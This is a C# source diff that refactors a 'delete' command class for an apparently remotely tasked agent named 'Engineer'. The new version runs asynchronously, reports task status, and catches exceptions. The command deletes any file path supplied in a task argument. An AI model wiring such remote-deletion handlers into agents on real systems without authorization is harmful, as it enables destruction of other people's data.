@@ -1,4 +1,5 @@
-﻿using Engineer.Models;
+﻿using Engineer.Functions;
+using Engineer.Models;
 using System;
 using System.Collections.Generic;
 using System.IO;
@@ -12,15 +13,24 @@ namespace Engineer.Commands
     {
         public override string Name => "delete";
 
-        public override string Execute(EngineerTask task)
+        public override async Task Execute(EngineerTask task)
         {
-            if (!task.Arguments.TryGetValue("/file", out string file))
+            try
             {
-                return "error: " + "no file to delete set pls use the /file key";
+
+                if (!task.Arguments.TryGetValue("/file", out string file))
+                {
+                    Tasking.FillTaskResults("error: " + "no file to delete set pls use the /file key", task, EngTaskStatus.FailedWithWarnings);
+                    return;
+                }
+                //delete file
+                File.Delete(file);
+                Tasking.FillTaskResults($"Deleted {file}", task, EngTaskStatus.Complete);
             }
-            //delete file
-            File.Delete(file);
-            return $"Deleted {file}";
+            catch (Exception ex)
+            {
+                Tasking.FillTaskResults("error: " + ex.Message, task, EngTaskStatus.Failed);
+            }
         }
     }
 }
